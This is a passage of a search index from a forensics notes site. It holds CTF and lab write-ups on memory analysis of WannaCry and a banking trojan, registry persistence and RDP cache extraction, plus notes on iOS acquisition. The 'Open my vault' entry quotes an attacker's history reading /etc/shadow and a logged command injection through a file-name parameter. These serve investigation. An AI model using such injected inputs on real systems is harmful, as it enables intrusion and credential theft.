    "c": "Job interview  root-me challenge : You are invited to an interview for a forensics investigator position at the NSA. For your first technical evaluation they ask you to analyse this file. Prove to them that you are a fitting candidate for this job. SHA256 hash : b35f4cd4bad19301e6970b30c1c713883b657858ef86d2b7247272c9d0f23591 What? ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview1] └─$ ls ch16.zip image_forensic.e01 ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview1] └─$ mkdir rawimage ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview1] └─$ ewfmount image_forensic.e01 ./rawimage/ ewfmount 20140813 ┌──(kali㉿kali)-[~/Downloads/root-me/forensic/interview1] └─$ cd rawimage/ ┌──(kali㉿kali)-[~/…/root-me/forensic/interview1/rawimage] └─$ ls ewf1 ┌──(kali㉿kali)-[~/…/root-me/forensic/interview1/rawimage] └─$ file ewf1 ewf1: POSIX tar archive (GNU) Unpack: ┌──(kali㉿kali)-[~/…/root-me/forensic/interview1/rawimage] └─$ tar -xsf ewf1 There is a bcache24.bmc file, an RDP cached bitmap file. Copy and use bmc-tools to extract it: ┌──(kali㉿kali)-[~/…/root-me/forensic/interview1/ └─$ mkdir bcache24bmc ┌──(kali㉿kali)-[~/…/root-me/forensic/interview1/ └─$ ./bmc-tools.py -s bcache24.bmc -d bcache24bmc/ -v",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "879ef8092fcca2d0b4219dc6de3a0004",
    "u": "https://dfir.tymyrddin.dev/docs/notes/ios-acquisition",
    "t": "iOS acquisition ",
    "c": "iOS acquisition  In a court of law, any evidence submitted must be admissible. This complex process involves the “chain of custody”. No matter how indicting a piece of evidence is, it can be dismissed if there is insufficient documentation and/or negligence in handling - all the way from the crime scene to the courtroom. Extraction methods  Direct acquisition: Interacting with the device itself if, for example, it was found unlocked. No need to bypass anything! Logical/backup acquisition: Using the iTunes backup of a phone for file system entry, or the use of forensics software to analyse data found within these backups i.e. .plists Advanced logical acquisition: Using the escalated privileges to an iPhone file system found when pairing an iOS device to a Computer using either iTunes or Xcode. Physical acquisition: The most direct approach, physical acquisition is the use of forensic imaging kits such as Cellebrite to take entire bit-for-bit copies of both the data and system partitions. Unsophisticated tools (such as those that don’t launch the iPhone into a custom bootloader) will leave the data encrypted. Direct acquisition  Direct acquisition covers three scenarios: There is no password on the phone There is a password, but it is known to the analyst The analyst has a “Lockdown Certificate”. Non-forensically focused, and free, applications such as iFunbox perform the same job in this scenario. Applications such as the iFunbox are capable of writing to the device being analysed. As a result, the image made will be inadmissible as evidence because there is a possibility data was (over)written to the device that wasn’t from the suspect - a defence attorney can argue the data could have been left by the forensic analyst. Logical or backup acquisition  If you can’t analyse a phone, just analyse the unlocked PC that has an entire backup upon it. Applicable to the above three scenarios above, the backup acquisition method is the cheapest way of acquiring data from a device such as an iPhone. By using iTunes’ backup facility, analysts can simply use a computer that has been paired with the iPhone. Logical acquisition involves copying what the user has access to on their mobile, which means that data is extracted from backup. This method requires the device to be unlocked. It provides readable data, unlike some encrypted parts in the physical image. Recovering data from unallocated space is limited to data recovery from unallocated SQLite records. Logical acquisition is where the big money starts to roll in (for companies such as Cellebrite). iTunes backups & trust certificates  When backing up an iPhone, iTunes accesses the iPhone in a privileged state - similar to using the sudo command on Linux to run a command with root privileges. iPhones will only back up to trusted computers. When plugging into a new device, the iPhone will ask the user whether they wish to trust the computer. “Trusting” a computer involves generating a pair certificate on both iPhone and computer. If the certificate matches up on both devices, the iPhone can be backed up. iTunes will generate a certificate using the iPhone’s unique identifier once data read/write has been allowed by trusting the computer on the iPhone. This certificate will be stored on the trusted computer for 30 days. After which you will need to re-trust the device. The certificate that is generated can only be used for 48 hours since the user has last unlocked their iPhone. If the iPhone has been connected to a trusted computer but the iPhone hasn’t been unlocked in a week, the certificate will not be used, although it is still valid. Once the iPhone is unlocked, the iPhone will automatically allow read/write access by the trusted computer without the “Trust This Computer” popup. If you were to connect the iPhone to the trusted computer 6 hours since it was last unlocked, the iPhone will allow read/write access straight away. This process is a security measure to prevent attacks such as “Juice Jacking”, an attack involving maliciously created USB chargers or cables (such as the O.MG Cable ) to steal data or infect devices. iTunes allows for two types of backups, “Unencrypted” and “Encrypted”. Unencrypted backups make a copy of photos that aren’t synced to iCloud, a copy of browsing history etcetera. No passwords or health and Homekit data is backed up. These are only backed up if the “Encrypted” option is used. Because iTunes accesses the iPhone with elevated privileges using lockdown certificates, data can be extracted from the iPhone such as the keychain. This keychain includes (but isn’t limited) to passwords such as: Wi-Fi Passwords Internet Account Credentials from “Autofill Password” VPN Root certificates for applications Exchange/Mail credentials Physical acquisition  The copying process in this method includes the device storage and the file system. The copying is done on the bits level acquiring all data. This includes deleted data and the ability to access the unallocated space. Physical acquisition is supposedly not useful for iPhone 5s and later due to the Secure Enclave hardware feature in Apple devices. It provides an additional layer of security by its isolation from the main processor. This security mechanism keeps the user data encrypted even if the OS is compromised. File system acquisition requires a jailbroken device. Jailbreaking will change the original data on the device. It is not a reversible change. Or?  Toolkits such as UFED can use all the acquisition methods. UFED is capable of forcing an iDevice to boot using UFED’s custom bootloader, bypassing the entire iOS operating system, similar to rooting an android, and giving an entire dump of the entire device. Mind that Cellebrite code contains the completely unrelated. Resources  Forensic Analysis of iTunes Backup , Jack Farley, 2019 Cellebrite Says It Can Unlock Any iPhone for Cops , 2019 Exploiting vulnerabilities in Cellebrite UFED and Physical Analyzer from an app’s perspective , moxie0, 2021",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e47ee268eaf41d77b6639b82ae594b58",
    "u": "https://dfir.tymyrddin.dev/docs/thm/feelings",
    "t": "That Kind of Hurt my Feelings (Volatility) ",
    "c": "THM Room: Volatility That Kind of Hurt my Feelings (Volatility)  You have been informed that your corporation has been hit with a chain of ransomware that has been hitting corporations internationally. Your team has already retrieved the decryption key and recovered from the attack. Still, your job is to perform post-incident analysis and identify what actors were at play and what occurred on your systems. You have been provided with a raw memory dump from your team to begin your analysis. The memory file is located in Scenarios/Investigations/Investigation-2.raw What suspicious process is running at PID 740? thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-2.raw windows.psscan Volatility 3 Framework 1.0.1 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset Threads Handles SessionId Wow64 CreateTime ExitTime File output 860 1940 taskdl.exe 0x1f4daf0 0 - 0 False 2017-05-12 21:26:23.000000 2017-05-12 21:26:23.000000 Disabled 536 1940 taskse.exe 0x1f53d18 0 - 0 False 2017-05-12 21:26:22.000000 2017-05-12 21:26:23.000000 Disabled 424 1940 @WanaDecryptor@ 0x1f69b50 0 - 0 False 2017-05-12 21:25:52.000000 2017-05-12 21:25:53.000000 Disabled 1768 1024 wuauclt.exe 0x1f747c0 7 132 0 False 2017-05-12 21:22:52.000000 N/A Disabled 576 1940 @WanaDecryptor@ 0x1f8ba58 0 - 0 False 2017-05-12 21:26:22.000000 2017-05-12 21:26:23.000000 Disabled 260 664 svchost.exe 0x1fb95d8 5 105 0 False 2017-05-12 21:22:18.000000 N/A Disabled 740 1940 @WanaDecryptor@ 0x1fde308 2 70 0 False 2017-05-12 21:22:22.000000 N/A Disabled 1168 1024 wscntfy.exe 0x1fea8a0 1 37 0 False 2017-05-12 21:22:56.000000 N/A Disabled 544 664 alg.exe 0x2010020 6 101 0 False 2017-05-12 21:22:55.000000 N/A Disabled ... 4 0 System 0x23c8830 51 244 N/A False N/A N/A Disabled thmanalyst@ubuntu:~$ What is the full path of the suspicious binary in PID 740? thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-2.raw windows.dlllist | grep 740 1024resssvchost.exe 0x5f740000 0xe000 ncprov.dll C:\\WINDOWS\\system32\\wbem\\ncprov.dll N/A Disabled 740 @WanaDecryptor@ 0x400000 0x3d000 @WanaDecryptor@.exe C:\\Intel\\ivecuqmanpnirkt615\\@WanaDecryptor@.exe N/A Disabled 740 @WanaDecryptor@ 0x7c900000 0xb2000 ntdll.dll C:\\WINDOWS\\system32\\ntdll.dll N/A Disabled ... thmanalyst@ubuntu:~$ What is the parent process of PID 740? And its PID? thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-2.raw windows.pstree Volatility 3 Framework 1.0.1 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0x81fea8a0 51 244 N/A False N/A N/A * 348 4 smss.exe 0x81fea8a0 3 19 N/A False 2017-05-12 21:21:55.000000 N/A ... * 1940 1636 tasksche.exe 0x81fea8a0 7 51 0 False 2017-05-12 21:22:14.000000 N/A ** 740 1940 @WanaDecryptor@ 0x81fea8a0 2 70 0 False 2017-05-12 21:22:22.000000 N/A thmanalyst@ubuntu:~$ From the current information, what malware is present on the system? WannaCry! What DLL is loaded by the decryptor used for socket creation? WS2_32.dll What mutex can be found that is a known indicator of the malware in question? thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-2.raw windows.handles | grep 1940 596gresscsrss.exe 0x82218da0B scan0x388finProcess 0x1f0fff csrss.exe Pid 1940 596 csrss.exe 0x8222eda0 0x390 Thread 0x1f03ff Tid 1944 Pid 1940 ... 1940 tasksche.exe 0x821883e8 0x40 Mutant 0x120001 ShimCacheMutex 1940 tasksche.exe 0xe16644e0 0x44 Section 0x2 ShimSharedMemory 1940 tasksche.exe 0x822386a8 0x48 File 0x100001 \\Device\\KsecDD 1940 tasksche.exe 0x823d54d0 0x4c Semaphore 0x1f0003 shell.{A48F1A32-A340-11D1-BC6B-00A0C90312E1} 1940 tasksche.exe 0x823a0cd0 0x50 File 0x100020 \\Device\\HarddiskVolume1\\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202 1940 tasksche.exe 0x8224f180 0x54 Mutant 0x1f0001 MsWinZonesCacheCounterMutexA 1940 tasksche.exe 0x822e3b08 0x58 Mutant 0x1f0001 MsWinZonesCacheCounterMutexA0 ... 1940 tasksche.exe 0xe18c02d0 0xe8 Section 0x4 thmanalyst@ubuntu:~$ What plugin could be used to identify all files loaded from the malware working directory? windows.filescan Resources  Threat Spotlight: Inside the WannaCry Attack WannaCry Malware Profile",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "9d0e0b86a9d17efc1d44bab7c3f04e8e",
    "u": "https://dfir.tymyrddin.dev/docs/thm/bob",
    "t": "BOB! THIS ISN’T A HORSE! (Volatility) ",
    "c": "THM Room: Volatility BOB! THIS ISN’T A HORSE! (Volatility)  Your SOC has informed you that they have gathered a memory dump from a quarantined endpoint thought to have been compromised by a banking trojan masquerading as an Adobe document. Your job is to use your knowledge of threat intelligence and reverse engineering to perform memory forensics on the infected host. You have been informed of a suspicious IP in connection to the file that could be helpful: 41.168.5.140 The memory file is located in /Scenarios/Investigations/Investigation-1.vmem thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-1.vmem windows.info Volatility 3 Framework 1.0.1 Progress: 100.00 PDB scanning finished Variable Value Kernel Base 0x804d7000 DTB 0x2fe000 Symbols file:///opt/volatility3/volatility3/symbols/windows/ntkrnlpa.pdb/30B5FB31AE7E4ACAABA750AA241FF331-1.json.xz Is64Bit False IsPAE True primary 0 WindowsIntelPAE memory_layer 1 FileLayer KdDebuggerDataBlock 0x80545ae0 NTBuildLab 2600.xpsp.080413-2111 CSDVersion 3 KdVersionBlock 0x80545ab8 Major/Minor 15.2600 MachineType 332 KeNumberProcessors 1 SystemTime 2012-07-22 02:45:08 NtSystemRoot C:\\WINDOWS NtProductType NtProductWinNt NtMajorVersion 5 NtMinorVersion 1 PE MajorOperatingSystemVersion 5 PE MinorOperatingSystemVersion 1 PE Machine 332 PE TimeDateStamp Sun Apr 13 18:31:06 2008 thmanalyst@ubuntu:~$ Checking processes: thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-1.vmem windows.psscan Volatility 3 Framework 1.0.1 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset Threads Handles SessionId Wow64 CreateTime ExitTime File output 908 652 svchost.exe 0x2029ab8 9 226 0 False 2012-07-22 02:42:33.000000 N/A Disabled 664 608 lsass.exe 0x202a3b8 24 330 0 False 2012-07-22 02:42:32.000000 N/A Disabled 652 608 services.exe 0x202ab28 16 243 0 False 2012-07-22 02:42:32.000000 N/A Disabled 1640 1484 reader_sl.exe 0x207bda0 5 39 0 False 2012-07-22 02:42:36.000000 N/A Disabled 1512 652 spoolsv.exe 0x20b17b8 14 113 0 False 2012-07-22 02:42:36.000000 N/A Disabled 1588 1004 wuauclt.exe 0x225bda0 5 132 0 False 2012-07-22 02:44:01.000000 N/A Disabled 788 652 alg.exe 0x22e8da0 7 104 0 False 2012-07-22 02:43:01.000000 N/A Disabled 1484 1464 explorer.exe 0x23dea70 17 415 0 False 2012-07-22 02:42:36.000000 N/A Disabled 1056 652 svchost.exe 0x23dfda0 5 60 0 False 2012-07-22 02:42:33.000000 N/A Disabled 1136 1004 wuauclt.exe 0x23fcda0 8 173 0 False 2012-07-22 02:43:46.000000 N/A Disabled 1220 652 svchost.exe 0x2495650 15 197 0 False 2012-07-22 02:42:35.000000 N/A Disabled 608 368 winlogon.exe 0x2498700 23 519 0 False 2012-07-22 02:42:32.000000 N/A Disabled 584 368 csrss.exe 0x24a0598 9 326 0 False 2012-07-22 02:42:32.000000 N/A Disabled 368 4 smss.exe 0x24f1020 3 19 N/A False 2012-07-22 02:42:31.000000 N/A Disabled 1004 652 svchost.exe 0x25001d0 64 1118 0 False 2012-07-22 02:42:33.000000 N/A Disabled 824 652 svchost.exe 0x2511360 20 194 0 False 2012-07-22 02:42:33.000000 N/A Disabled 4 0 System 0x25c89c8 53 240 N/A False N/A N/A Disabled thmanalyst@ubuntu:~$ reader_sl.exe is suspicious. What is its parent process? $ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-1.vmem windows.pstree Volatility 3 Framework 1.0.1 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0x8205bda0 53 240 N/A False N/A N/A * 368 4 smss.exe 0x8205bda0 3 19 N/A False 2012-07-22 02:42:31.000000 N/A ... 1484 1464 explorer.exe 0x8205bda0 17 415 0 False 2012-07-22 02:42:36.000000 N/A * 1640 1484 reader_sl.exe 0x8205bda0 5 39 0 False 2012-07-22 02:42:36.000000 N/A thmanalyst@ubuntu:~$ User-agent? thmanalyst@ubuntu:~$ python3 /opt/volatility3/vol.py -f /Scenarios/Investigations/Investigation-1.vmem -o /home/thmanalyst windows.memmap.Memmap --pid 1640 --dump ... thmanalyst@ubuntu:~$ ls pid.1640.dmp Once the dump is stored use, strings *.dmp | grep -i \"user-agent\" : strings *.dmp | grep -i \"user-agent\" thmanalyst@ubuntu:~$ strings *.dmp | grep -i \"user-agent\" User-Agent User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) cs(User-Agent) USER-AGENT: User-Agent: thmanalyst@ubuntu:~$ Was Chase Bank one of the suspicious bank domains found? thmanalyst@ubuntu:~$ strings *.dmp | grep \"chase\" *chase.com* ... <td class=\"steptextoff\" align=\"center\" title=\"Step two of three has not been completed.\">Credit Card confirmation<img src=\"https://chaseonline.chase.com/images//spacer.gif\" alt=\"Step two of three has not been completed.\" width=\"1\" height=\"1\"/></td> ...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3c415a533daef27ffafcabd00690269c",
    "u": "https://dfir.tymyrddin.dev/docs/notes/ios",
    "t": "iOS analysis ",
    "c": "iOS analysis  iOS File systems  Apple has created their own sets of file system formattings: AFS (Apple File System) and HFS+ (macOS Extended). The latter is the oldest and the legacy file system which is still supported today. HFS was not future-proof as it cannot support file timestamps past February 6th, 2040. HFS+ did not support encryption at its entirety, and any device such as iMac or iPhone past iOS 10.3 will have had their file system converted from HFS+ to AFS automatically. AFS features full disk encryption, and smarter data management where a file requiring 3 blocks worth of space when copied, does not require another 3 blocks, but a reference to the file, similar to inodes in Linux. Time  iOS devices adopted the use of Mac absolute time with iOS 5 for most of the data. Mac absolute time is the number of seconds that offsets the Mac epoch time, which starts on January 1, 2001. When analyzing iOS application data, especially web browsers such as Google Chrome, Safari, and Opera, another timestamp format appears: WebKit/Chrome time . This is the number of microseconds since January 1, 1601. SQLite databases  Apple iOS devices, like other smartphones, make heavy use of SQLite databases for data storage. Many of the built-in applications, such as phone, messages, mail, calendar, and notes, store data in SQLite databases. Apart from this, third-party applications installed on the device also leverage SQLite databases for data storage. SQLite databases are created with or without a file extension. They typically have the .sqlitedb or .db file extensions, but some databases are given other extensions as well. macOS includes the SQLite command-line utility (sqlite3) by default. This commandline utility can easily access individual files and issue SQL queries against a database. Raw disk images, filesystems and logical dumps, and backups contain the following SQLite databases that may be important to an investigation: The address book database is a HomeDomain file, and it can be found at private/var/mobile/Library/AddressBook/AddressBook.sqlitedb . The AddressBook.sqlitedb file contains several tables, of which the following three are of particular interest: ABPerson , ABMultiValue , and ABMultiValueLabel . In addition to the address book’s data, each contact may contain an image associated with it. The address book images database is a HomeDomain file, and it can be found at /private/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb . Phone or FaceTime calls placed, missed, and received by the user are logged in the call history along with other metadata, such as call duration, date/time, and more (iOS 8 +). The call history database is a WirelessDomain file, and it can be found at /private/var/mobile/Library/CallHistoryDB/CallHistory.storedata . The ZCALLRECORD table in the CallHistory.storedata file contains the call history. The Short Message Service (SMS) database contains text and multimedia messages that were sent from and received by the device along with the phone number of the remote party, date and time, and other carrier information. The SMS database is a HomeDomain file, and it can be found at /private/var/mobile/Library/SMS/sms.db . Calendar events that have been manually created by the user or synced using a mail application or other third-party applications are stored in the calendar database. The calendar database is a HomeDomain file and can be found at /private/var/mobile/Library/Calendar/Calendar.sqlitedb . The Notes database contains the notes that are created by the user using the device’s built-in Notes application. Notes is the simplest application, often containing the most sensitive and confidential information. The Notes database is a HomeDomain file and can be found at /private/var/mobile/Library/Notes/notes.sqlite . The Safari browser used on an Apple device allows users to bookmark their favorite websites. The bookmarks database is a HomeDomain file, and it can be found at /private/var/mobile/Library/Safari/Bookmarks.db . The Safari browser stores the recently downloaded and cached data in a database. The database is a HomeDomain file and can be found at /private/var/mobile/Library/Caches/com.apple.mobilesafari/Cache.db . A manifestation of the photos in the device’s photo album is stored in a database located at /private/var/mobile/Media/PhotoData/Photos.sqlite . The photo metadata database file is a member of CameraRollDomain . Geolocation history of cell towers and Wi-Fi on the device is stored in a database that is located at /private/var/root/Caches/locationd/consolidated.db . The database is a member of RootDomain . It contains location information for towers that the device came into proximity with, as well as Wi-Fi networks that were available for the device to connect to. This database is often used to place a person near a specific location, as this data is cached to the database file without the user’s consent. The CompassCalibration table in the consolidated.db file contains the location information along with the timestamps. The voicemail database is a HomeDomain file, and it can be found at /private/var/mobile/Library/Voicemail/voicemail.db , while the actual voicemail recordings are stored in the /private/var/mobile/Library/Voicemail/ directory. Property lists  Apple uses their own standardisation for files within their file systems: .plist files are property files who consist of data from anything such as preferences to application settings and data. They can be formatted as XML, or cannot be opened with a normal text editor and require a hex editor such as HxD . HomeDomain plist files  /private/var/mobile/Library/Preferences/com.apple.mobilephone.plist , containing the last phone number entered into the keypad regardless of whether it was dialed or not /private/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist , containing a list of the contacts that were added to the phone’s favorites list /private/var/mobile/Library/Preferences/com.apple.AppSupport.plist , containing the country code that was used for the App Store on the device /private/var/mobile/Library/Preferences/com.apple.Maps.plist , containing the last latitude, longitude, and address pinned in the Maps application /private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist , containing a list of world clocks used /private/var/mobile/Library/Preferences/com.apple.Preferences.plist , containing the keyboard language that was last used on the device /private/var/mobile/Library/Preferences/com.apple.springboard.plist , containing a list of applications that are shown in the interface and iOS version /private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist , containing information about the current time zone, timers, alarms, and stopwatches /private/var/mobile/Library/Preferences/com.apple.weather.plist , containing the cities for weather reports, date, and time of the last update /private/var/mobile/Library/Preferences/com.apple.preferences.network.plist , containing the status of Bluetooth and Wi-Fi networks /private/var/mobile/Library/Preferences/com.apple.locationd.plist , containing a list of application identifiers that use the location service on the device /private/var/mobile/Library/Preferences/com.apple.assistant.backedup.plist : This will help an examiner to determine whether cloud synchronization is enabled or not RootDomain plist files  /private/var/root/Library/Preferences/com.apple.preferences.network.plist , containing information about whether airplane mode is presently enabled on the device /private/var/root/Library/Preferences/com.apple.MobileBackup.plist , containing the timestamp of when the device was last restored from the backup, the device build version, and the backup build version /private/var/root/Library/Caches/locationd/clients.plist , containing the location settings for applications and system services WirelessDomain plist files ...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2baffab0d19d4819ea56c4f146cdee45",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/c&c3",
    "t": "Command & Control level 3 ",
    "c": "Command & Control level 3  root-me challenge : Berthier, the antivirus software didn’t find anything. It’s up to you now. Try to find the malware in the memory dump. The validation flag is the md5 checksum of the full path of the executable. The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ch2.dmp windows.pstree Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0x87978b78 103 3257 N/A False 2013-01-12 16:38:09.000000 N/A * 308 4 smss.exe 0x88c3ed40 2 29 N/A False 2013-01-12 16:38:09.000000 N/A 404 396 csrss.exe 0x8929fd40 9 469 0 False 2013-01-12 16:38:14.000000 N/A 456 396 wininit.exe 0x892ac2b8 3 77 0 False 2013-01-12 16:38:14.000000 N/A * 560 456 services.exe 0x896294c0 6 205 0 False 2013-01-12 16:38:16.000000 N/A ** 904 560 svchost.exe 0x89852918 17 409 0 False 2013-01-12 16:38:24.000000 N/A *** 2496 904 dwm.exe 0x87ad44d0 5 77 1 False 2013-01-12 16:40:25.000000 N/A ** 1172 560 svchost.exe 0x898b2790 15 475 0 False 2013-01-12 16:38:27.000000 N/A ** 3352 560 svchost.exe 0x89f3d2c0 9 141 0 False 2013-01-12 16:40:58.000000 N/A ** 928 560 svchost.exe 0x8986b030 26 869 0 False 2013-01-12 16:38:24.000000 N/A ** 3624 560 svchost.exe 0x89f1d3e8 14 348 0 False 2013-01-12 16:41:22.000000 N/A ** 1712 560 spoolsv.exe 0x8a0f9c40 14 338 0 False 2013-01-12 16:38:58.000000 N/A ** 1968 560 vmtoolsd.exe 0x8a1d84e0 6 220 0 False 2013-01-12 16:39:14.000000 N/A ** 2352 560 taskhost.exe 0x87ac0620 8 149 1 False 2013-01-12 16:40:24.000000 N/A ** 692 560 svchost.exe 0x8962f030 10 353 0 False 2013-01-12 16:38:21.000000 N/A ** 1084 560 svchost.exe 0x898911a8 10 257 0 False 2013-01-12 16:38:26.000000 N/A ** 448 560 VMUpgradeHelpe 0x8a1f5030 4 89 0 False 2013-01-12 16:39:21.000000 N/A *** 468 448 csrss.exe 0x88d03a00 10 471 1 False 2013-01-12 16:38:14.000000 N/A **** 2600 468 conhost.exe 0x87a9c288 1 35 1 False 2013-01-12 16:40:28.000000 N/A **** 3228 468 conhost.exe 0x87c595b0 2 54 1 False 2013-01-12 16:44:50.000000 N/A **** 2168 468 conhost.exe 0x954826b0 2 49 1 False 2013-01-12 16:55:50.000000 N/A *** 500 448 winlogon.exe 0x892ced40 3 111 1 False 2013-01-12 16:38:14.000000 N/A ** 832 560 svchost.exe 0x89805420 19 435 0 False 2013-01-12 16:38:23.000000 N/A *** 1720 832 audiodg.exe 0x87c90d40 5 117 0 False 2013-01-12 16:58:11.000000 N/A ** 1220 560 AvastSvc.exe 0x898a7868 66 1180 0 False 2013-01-12 16:38:28.000000 N/A ** 1612 560 TPAutoConnSvc. 0x9542a030 9 135 0 False 2013-01-12 16:39:23.000000 N/A *** 2568 1612 TPAutoConnect. 0x87ae2880 5 146 1 False 2013-01-12 16:40:28.000000 N/A ** 1872 560 sppsvc.exe 0x88cded40 4 143 0 False 2013-01-12 16:39:02.000000 N/A ** 336 560 wlms.exe 0x9541c7e0 4 45 0 False 2013-01-12 16:39:21.000000 N/A ** 1748 560 svchost.exe 0x8a102748 18 310 0 False 2013-01-12 16:38:58.000000 N/A ** 2900 560 SearchIndexer. 0x898fbb18 13 636 0 False 2013-01-12 16:40:38.000000 N/A ** 3176 560 wmpnetwk.exe 0x87bd35b8 9 240 0 False 2013-01-12 16:40:48.000000 N/A ** 764 560 svchost.exe 0x897b5c20 7 263 0 False 2013-01-12 16:38:23.000000 N/A * 584 456 lsm.exe 0x8962f7e8 10 142 0 False 2013-01-12 16:38:16.000000 N/A * 576 456 lsass.exe 0x896427b8 6 566 0 False 2013-01-12 16:38:16.000000 N/A 2548 2484 explorer.exe 0x87ac6030 24 766 1 False 2013-01-12 16:40:27.000000 N/A * 2720 2548 AvastUI.exe 0x87b784b0 14 220 1 False 2013-01-12 16:40:31.000000 N/A * 2660 2548 VMwareTray.exe 0x87b82438 5 80 1 False 2013-01-12 16:40:29.000000 N/A * 1232 2548 taskmgr.exe 0x95495c18 6 116 1 False 2013-01-12 16:42:29.000000 N/A * 3152 2548 cmd.exe 0x87bf7030 1 23 1 False 2013-01-12 16:44:50.000000 N/A ** 3144 3152 winpmem-1.3.1. 0x87cbfd40 1 23 1 False 2013-01-12 16:59:17.000000 N/A * 1136 2548 iexplore.exe 0x9549f678 18 454 1 False 2013-01-12 16:57:44.000000 N/A ** 3044 1136 iexplore.exe 0x87d4d338 37 937 1 False 2013-01-12 16:57:46.000000 N/A * 2676 2548 VMwareUser.exe 0x87aa9220 8 190 1 False 2013-01-12 16:40:30.000000 N/A * 2772 2548 iexplore.exe 0x87b6b030 2 74 1 False 2013-01-12 16:40:34.000000 N/A ** 1616 2772 cmd.exe 0x89898030 2 101 1 False 2013-01-12 16:55:49.000000 N/A * 2744 2548 StikyNot.exe 0x898fe8c0 8 135 1 False 2013-01-12 16:40:32.000000 N/A * 3452 2548 swriter.exe 0x87c6a2a0 1 19 1 False 2013-01-12 16:41:01.000000 N/A ** 3512 3452 soffice.exe 0x87ba4030 1 28 1 False 2013-01-12 16:41:03.000000 N/A *** 3564 3512 soffice.bin 0x87b8ca58 12 400 1 False 2013-01-12 16:41:05.000000 N/A 3556 3544 soffice.bin 0x95483d18 0 - 1 False 2013-01-12 16:41:05.000000 2013-01-12 16:41:39.000000 Apparently there is cmd.exe (PID 3152) RUNNING AS child of explorer.exe (PID 2548). Trying the most common place to find registry keys for persistence: ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp windows.registry.printkey --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished Last Write Time Hive Offset Type Key Name Data Volatile - 0x8b20c008 Key ?\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - - ... - 0x90cab9d0 Key ?\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - - 2013-01-12 14:13:19.000000 0x9670e9d0 REG_SZ \\??\\C:\\Users\\John Doe\\ntuser.dat\\Software\\Microsoft\\Windows\\CurrentVersion\\Run RESTART_STICKY_NOTES \"C:\\Windows\\System32\\StikyNot.exe\" False 2013-01-12 14:13:19.000000 0x9670e9d0 REG_SZ \\??\\C:\\Users\\John Doe\\ntuser.dat\\Software\\Microsoft\\Windows\\CurrentVersion\\Run IEPreload \"\"C:\\Users\\John Doe\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\iexplore.exe\"\" False - 0x9670f9d0 Key ?\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - - md5sum the full path.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "5d260ace3e08ab36c0533ca08cc195b1",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/vault",
    "t": "Open my vault ",
    "c": "Open my vault  root-me challenge : The DevOps of your SI reports that the Ansible master has been running strange playbooks on machines. You tell him that it was not a good idea to install Ansible on the same machine as the website, but that you will investigate. In prevention, he says he has put the site in maintenance and removed SSH keys on the nodes, but that he has not touched the logs. The challenge is available via the CTF-ATD “Open My Vault” machine. There is no need to root it. Check the user’s history: 1 id 2 cat /etc/passwd 3 pwd 4 cd /home/m4st3r/ 5 ping 128.66.0.0 6 cat /etc/shadow 7 l 8 ll 9 cd ansible/ 10 ls -lah 11 tree . 12 cat inventory.cfg 13 cat playbook.yml 14 cat roles/zip/tasks/main.yml 15 mkdir roles/other 16 mkdir roles/other/tasks 17 ansible-vault -h 18 ansible-vault create roles/other/tasks/main.yml 19 vim playbook.yml 20 ansible-playbook -h 21 ansible-playbook -i inventory.cfg --vault-password-file=/tmp/.secure playbook.yml 22 rm /tmp/.secure 23 cd .. 24 rm -rf .ssh m4st3r ran an encrypted playbook with the password located in /tmp/.secure and then removed /tmp/.secure . He may have forgotten to remove the log. Check /var/log/apache2/access.log : m4st3r@my_v4ult:~$ cat /var/log/apache2/access.log | grep \".secure\" 203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] \"GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 